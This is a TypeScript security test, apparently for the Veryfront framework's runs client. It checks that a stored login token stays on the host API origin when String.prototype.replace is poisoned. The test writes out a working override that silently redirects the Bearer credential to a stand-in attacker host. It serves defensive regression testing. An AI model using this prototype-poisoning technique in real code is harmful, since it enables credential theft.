/**
 * Runs client destination handling under poisoned intrinsics.
 *
 * `createRunsClient()` is a public `veryfront/runs` export, and with no
 * explicit credentials it falls back to the host-owned Veryfront Cloud
 * bootstrap — which resolves the host-private stored login token. A served
 * project runs in the same process and can replace `String.prototype.replace`
 * or the `URL.prototype.origin` getter before calling it, so the API base that
 * the Bearer token is attached to must be normalized through captured
 * intrinsics. Prototype replacement is a process-global effect, so this lives
 * in the semantic integration suite.
 */
import "#veryfront/schemas/_test-setup.ts";
import { assertEquals } from "#veryfront/testing/assert.ts";
import { afterEach, describe, it } from "#veryfront/testing/bdd.ts";
import {
  deleteEnv,
  deleteHostSecret,
  setEnv,
  setHostSecret,
} from "#veryfront/platform/compat/process/env.ts";
import { installMockFetch, restoreMockFetch } from "#veryfront/testing/mock-fetch.ts";

import { createRunsClient } from "../../../../../src/runs/runs-client.ts";

const TOKEN = "stored-login-token";
const HOST_API_BASE = "https://runs-host.example";
const ATTACKER_API_BASE = "https://runs-attacker.example";
const nativeReplace = String.prototype.replace;
const testApply = Reflect.apply;

describe("runs client destination intrinsic boundary", () => {
  afterEach(() => {
    String.prototype.replace = nativeReplace;
    restoreMockFetch();
    deleteHostSecret("VERYFRONT_API_TOKEN");
    try {
      deleteEnv("VERYFRONT_API_BASE_URL");
    } catch {
      // expected: env may already be unset
    }
  });

  it("does not let a replaced String.prototype.replace redirect the credential", async () => {
    setEnv("VERYFRONT_API_BASE_URL", HOST_API_BASE);
    setHostSecret("VERYFRONT_API_TOKEN", TOKEN);

    const requests: Array<{ url: string; authorization: string | null }> = [];
    installMockFetch(
      ((input: string | URL | Request, init?: RequestInit) => {
        requests.push({
          url: String(input),
          authorization: new Headers(init?.headers).get("Authorization"),
        });
        return Promise.resolve(
          Response.json({
            data: [],
            page_info: { self: null, first: null, next: null, prev: null },
          }),
        );
      }) as typeof fetch,
    );

    // A hostile project config replaces the normalizer the runs client used to
    // call live. Only the host API base is rewritten, so the rest of the
    // framework keeps working while the credential's destination moves.
    String.prototype.replace = function (
      this: unknown,
      ...args: Parameters<String["replace"]>
    ): string {
      if (String(this) === HOST_API_BASE) return ATTACKER_API_BASE;
      return testApply(nativeReplace, this, args) as string;
    };

    await createRunsClient().list({ projectReference: "dreamy-haven" });

    assertEquals(requests.length, 1);
    assertEquals(requests[0]!.authorization, `Bearer ${TOKEN}`);
    assertEquals(
      new URL(requests[0]!.url).origin,
      HOST_API_BASE,
      "the host-private credential must stay on the host-owned API origin",
    );
  });
});
